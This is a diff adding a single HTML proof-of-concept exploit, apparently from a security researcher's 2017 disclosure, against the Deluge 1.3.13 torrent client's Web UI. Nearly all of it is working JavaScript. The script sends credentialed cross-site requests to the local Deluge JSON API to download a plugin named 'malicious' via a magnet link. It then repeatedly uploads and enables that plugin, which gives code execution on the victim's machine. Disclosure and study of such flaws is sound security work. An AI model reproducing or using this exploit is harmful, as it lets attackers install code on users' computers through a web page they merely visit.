@@ -1,0 +1,85 @@
+<!--
+Deluge 1.3.13 Web UI CSRF
+
+Tested on Linux, macOS and Windows.
+
+Kyle Neideck, February 2017
+kyle@bearisdriving.com
+-->
+<html><body><script>
+let PLUGIN_NAME = 'malicious';
+let PLUGIN_FILE = 'malicious-0.1-py2.7.egg';
+let MAGNET_LINK =
+   'magnet:?xt=urn:btih:1b02570de69c0cb6d12c544126a32c67c79024b4' +
+       '&dn=malicious-0.1-py2.7.egg' +
+       '&tr=http%3A%2F%2Ftracker.example.com%3A6969%2Fannounce';
+
+function send_deluge_json(json) {
+   console.log('Sending: ' + json);
+
+   for (let proto of ['http','https']) {
+       let xhr = new XMLHttpRequest();
+
+       xhr.open('POST', proto + '://localhost:8112/json');
+       xhr.setRequestHeader('Content-Type', 'text/plain');
+       xhr.withCredentials = true;
+       xhr.onload = function() { console.log(xhr); };
+       xhr.send(json);
+   }
+}
+
+let download_location =
+   (navigator.appVersion.indexOf("Win") != -1) ?
+       'C:\\\\Users\\\\Public' : '/tmp';
+
+// Download a malicious plugin using a Magnet link.
+//
+// Using the /upload endpoint or adding a .torrent file wouldn't work. We could
+// upload the file (either a .torrent or the plug-in itself), but it would be
+// saved in a temp dir with a random name. CORS would prevent us from reading
+// the path to the file from the response, and to finish the process we'd need
+// to send a second request that includes that path.
+send_deluge_json('{' +
+   '"method":"web.add_torrents",' +
+   '"params":[[{' +
+       '"path":"' + MAGNET_LINK + '",' +
+       '"options":{' +
+           '"file_priorities":[],' +
+           '"add_paused":false,' +
+           '"compact_allocation":false,' +
+           '"download_location":"' + download_location + '",' +
+           '"move_completed":false,' +
+           '"move_completed_path":"' + download_location + '",' +
+           '"max_connections":-1,' +
+           '"max_download_speed":-1,' +
+           '"max_upload_slots":-1,' +
+           '"max_upload_speed":-1,' +
+           '"prioritize_first_last_pieces":false}}]],' +
+       '"id":12345}');
+
+window.stop = false;
+
+// Repeatedly try to enable the plugin, since we can't tell when it will finish
+// downloading.
+function try_to_add_and_enable_plugin() {
+   send_deluge_json('{' +
+       '"method":"web.upload_plugin",' +
+       '"params":["' + PLUGIN_FILE + '","' +
+           download_location + '/' + PLUGIN_FILE + '"],' +
+       '"id":12345}');
+
+   send_deluge_json('{' +
+       '"method":"core.enable_plugin",' +
+       '"params":["' + PLUGIN_NAME + '"],' +
+       '"id":12345}');
+
+   if (!window.stop) {
+       window.setTimeout(try_to_add_and_enable_plugin, 500);
+   }
+}
+
+try_to_add_and_enable_plugin();
+</script>
+<button onclick="window.stop = true">Stop sending requests</button>
+</body></html>
+
